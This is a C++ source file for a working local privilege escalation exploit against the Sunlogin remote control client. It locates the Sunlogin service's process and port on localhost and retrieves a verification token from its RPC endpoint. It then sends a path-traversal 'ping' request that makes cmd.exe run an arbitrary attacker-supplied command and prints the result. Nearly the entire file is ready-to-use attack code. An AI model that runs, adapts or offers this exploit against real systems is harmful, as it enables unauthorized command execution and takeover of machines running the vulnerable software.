// SunloginLPE.cpp : 定义控制台应用程序的入口点。

#include "stdafx.h"

#include<regex>
using namespace std;

int main(int argc, char* argv[])
{
	if (argc <= 1)
	{
		printf("Usage: %s COMMAND \n", argv[0]);
		printf("Author: KEY@ZFINFO_YHLAB \n");
	}
	else
	{
		char cPid[10];
		int retCodeA = getSunloginPID(cPid);
		char cPort[10];
		int retCodeB = retCodeA == 1 ? getSunloginPort(cPid, cPort) : 0;
		if (retCodeB)
		{
			// printf("%s \n", port);
			char* cUrlTemplate = "http://127.0.0.1:%s";
			char cSunloginUrl[25];
			sprintf_s(cSunloginUrl, cUrlTemplate, cPort);
			// HTTP
			httplib::Client cli(cSunloginUrl);
			// 获取CID
			if (auto rpcRes = cli.Get("/cgi-bin/rpc?action=verify-haras")) {
				regex rPID("verify_string\":\"(\\w+)?\"");
				smatch mResult;
				regex_search(rpcRes->body, mResult, rPID);
				char cCid[50];
				strcpy_s(cCid, 50, mResult.str(1).c_str());
				// printf("%s \n", cid);
				// 命令执行
				char* cCookieTemplate = "CID=%s";
				char cCookie[55];
				sprintf_s(cCookie, cCookieTemplate, cCid);
				httplib::Headers headers = {
					{ "Cookie", cCookie }
				};
				char* cCmdTemplate = "/check?cmd=ping..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\\\system32\\\\cmd.exe /c %s";
				char cCmd[2048];
				sprintf_s(cCmd, cCmdTemplate, argv[1]);
				auto res = cli.Get(cCmd, headers);
				printf("Result:\n%s\n", (res->body).c_str());
			}
			else
			{
				printf("Network connection failed. \n");
			}
		}
		else
		{
			printf("Maybe the vulnerability doesn't exist. \n");
		}

	}
	return 0;
}

